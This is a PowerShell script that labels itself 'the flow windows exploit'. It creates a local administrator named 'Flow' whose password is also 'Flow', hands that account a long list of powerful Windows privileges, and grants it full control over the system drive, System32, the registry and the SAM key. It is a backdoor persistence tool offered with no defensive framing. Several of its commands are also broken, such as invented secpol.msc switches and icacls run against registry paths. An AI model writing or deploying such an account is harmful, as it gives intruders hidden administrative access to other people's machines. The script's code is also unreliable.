# Check if the script is running with administrative privileges. (Is running as administrator)
if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -and (([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups | Where-Object { $_.Value -eq 'S-1-5-32-544' }))) {
    Write-Host "This script requires administrative privileges. Please run as administrator."
    exit
}

# Get the system drive and the system root dynamically through environment variables.
$SystemDrive = $env:SystemDrive
$SystemRoot = $env:SystemRoot

# ================================================================================================= #
#     Create a new local administrator on the machine, and grant it every permission needed.        #
# ================================================================================================= #

# User information.
$Username = "Flow"
$Password = "Flow"

# Create a secure password from the string.
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force

# Create a new local user on the machine.
New-LocalUser -Name $Username -Password $SecurePassword -FullName "Flow" -Description "Account created from the flow windows exploit."

# Add the local user to the administrators group.
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Grant the user logon permissions.
secpol.msc /add-user-rights $Username SeBatchLogonRight
secpol.msc /add-user-rights $Username SeInteractiveLogonRight
secpol.msc /add-user-rights $Username SeNetworkLogonRight
secpol.msc /add-user-rights $Username SeRemoteInteractiveLogonRight

# Create a list of each permission to give to the user.
$PermissionsList = @(
    "SeDebugPrivilege", 
    "SeBackupPrivilege", 
    "SeRestorePrivilege", 
    "SeTakeOwnershipPrivilege", 
    "SeIncreaseQuotaPrivilege", 
    "SeLoadDriverPrivilege", 
    "SeSystemTimePrivilege", 
    "SeRemoteShutdownPrivilege", 
    "SeManageVolumePrivilege", 
    "SeShutdownPrivilege", 
    "SeUndockPrivilege", 
    "SeIncreaseBasePriorityPrivilege", 
    "SeAssignPrimaryTokenPrivilege", 
    "SeCreatePagefilePrivilege", 
    "SeSecurityPrivilege", 
    "SeRelabelPrivilege", 
    "SeImpersonatePrivilege", 
    "SeTcbPrivilege", 
    "SeAuditPrivilege", 
    "SeChangeNotifyPrivilege", 
    "SeCreateTokenPrivilege", 
    "SeBatchLogonRight", 
    "SeInteractiveLogonRight", 
    "SeNetworkLogonRight", 
    "SeRemoteInteractiveLogonRight"
)

# For every permission in the permission list.
foreach ($Permission in $PermissionsList) {
    # Assign the permission to the new user.
    ntrights -u $Username +r $Permission
}

# Grant the user full control over the system drive.
icacls "$SystemDrive\" /grant "${Username}:(F)" /T /C

# Grant the user full control over important system folders.
icacls "$SystemRoot\System32" /grant "${Username}:(OI)(CI)F" /T /C /Q

# Grant the user full control over the flow directory.
icacls "$SystemRoot\Flow" /grant "${Username}:(OI)(CI)F" /T /C /Q

# Give the user full control over the registry.
icacls "HKCU" /grant "${Username}:(F)"
icacls "HKLM" /grant "${Username}:(F)"

# Give the user full control over specific registry keys.
icacls "HKLM:\SYSTEM\CurrentControlSet\Control" /grant "${Username}:(F)"
icacls "HKLM:\SOFTWARE\Microsoft\Windows" /grant "${Username}:(F)"
icacls "HKLM:\SAM" /grant "${Username}:(F)"
